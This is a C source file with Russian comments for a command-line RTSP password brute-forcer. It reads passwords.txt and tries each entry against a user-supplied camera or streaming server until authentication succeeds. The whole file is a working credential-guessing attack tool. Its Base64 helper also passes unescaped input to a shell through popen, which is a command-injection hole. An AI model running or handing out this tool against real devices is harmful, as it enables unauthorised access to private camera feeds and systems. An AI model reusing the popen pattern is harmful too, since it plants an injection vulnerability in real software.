#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 2048
#define PASSWORD_LENGTH 100

// Функция для кодирования в Base64 через системный вызов (Termux-friendly)
char *base64_encode(const char *input) {
    char command[BUFFER_SIZE];
    char *result = malloc(BUFFER_SIZE);
    FILE *fp;

    snprintf(command, sizeof(command), "echo -n \"%s\" | base64", input);
    fp = popen(command, "r");
    if (!fp) {
        perror("Ошибка при запуске base64");
        free(result);
        return NULL;
    }

    fgets(result, BUFFER_SIZE, fp);
    result[strcspn(result, "\n")] = '\0'; // Удаляем \n

    pclose(fp);
    return result;
}

// Функция для брутфорса одного пароля
int rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    char userpass[200];

    snprintf(userpass, sizeof(userpass), "%s:%s", username, password);
    char *auth_encoded = base64_encode(userpass);
    if (!auth_encoded) return 0;

    // Создаём сокет
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Ошибка создания сокета");
        free(auth_encoded);
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Ошибка подключения");
        close(sock);
        free(auth_encoded);
        return 0;
    }

    snprintf(request, sizeof(request),
             "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
             "CSeq: 1\r\n"
             "Authorization: Basic %s\r\n\r\n",
             target_ip, auth_encoded);

    send(sock, request, strlen(request), 0);
    recv(sock, response, sizeof(response) - 1, 0);
    response[sizeof(response) - 1] = '\0';

    if (strstr(response, "200 OK")) {
        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password);
        close(sock);
        free(auth_encoded);
        return 1;
    } else {
        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password);
    }

    close(sock);
    free(auth_encoded);
    return 0;
}

int main() {
    char target_ip[64];
    int target_port = 554;
    char username[100];
    char password[PASSWORD_LENGTH];

    printf("Введите IP RTSP сервера: ");
    scanf("%63s", target_ip);
    getchar(); // съедаем лишний Enter

    printf("Введите логин: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0';

    FILE *file = fopen("passwords.txt", "r");
    if (!file) {
        perror("Ошибка: файл passwords.txt не найден");
        return 1;
    }

    printf("\nНачинаем брутфорс...\n\n");

    while (fgets(password, PASSWORD_LENGTH, file)) {
        password[strcspn(password, "\n")] = 0;

        if (rtsp_bruteforce(target_ip, target_port, username, password)) {
            printf("\n\033[1;34m[*] Пароль найден. Программа завершена.\033[0m\n");
            break;
        }

        sleep(1); // немного подождать, чтобы не заспамить сервер
    }

    fclose(file);
    return 0;
}
